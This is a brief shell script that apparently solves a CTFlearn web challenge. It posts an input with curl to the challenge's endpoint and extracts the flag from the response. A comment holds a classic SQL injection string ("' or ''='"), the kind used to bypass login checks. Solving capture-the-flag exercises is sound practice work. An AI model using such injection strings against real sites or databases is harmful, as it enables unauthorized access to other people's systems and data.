#!/bin/sh

payload='fl4g__giv3r' # "' or ''='"
endpoint='https://web.ctflearn.com/web4/'
data=`curl -sL --data-urlencode "input=$payload" $endpoint`

echo $data | grep -io 'data:.*' | cut -d' ' -f2
